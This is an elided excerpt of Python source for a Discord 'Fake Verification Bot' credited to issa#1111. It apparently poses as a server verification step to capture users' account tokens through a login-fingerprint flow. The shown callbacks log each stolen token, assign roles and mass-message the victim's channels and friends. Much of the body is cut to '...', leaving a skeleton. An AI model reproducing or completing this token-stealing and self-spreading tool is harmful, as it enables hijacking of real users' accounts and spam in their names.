...
def bot_title():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by issa#1111")
    print(f"""\n\n{Fore.RESET}                            ███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗
                            ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝
                            █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
                            ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  
                            ██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     
                            ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝\n""".replace('█', f'{b}█{y}'))
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}raadev | issa#1111 | issa#1111 | issa#1111 | issa#1111 | https://di\n{y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))
...
bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by issa#1111", intents=intents)
...
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching, name="WICKBOT.COM | SHARD19"))
        ...
        async def on_fingerprint(data):
            ...
            async def on_userdata(user):
                ...
                async def on_token(token):
                    ...
                    if logs_channel:
                        embed_user.set_footer(text="Made by issa#1111")
                    ...
                    if give_role == True:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_role.set_footer(text="Made by issa#1111")
                    ...
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_cdm.set_footer(text="Made by issa#1111")
                    ...
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_fdm.set_footer(text="Made by issa#1111")
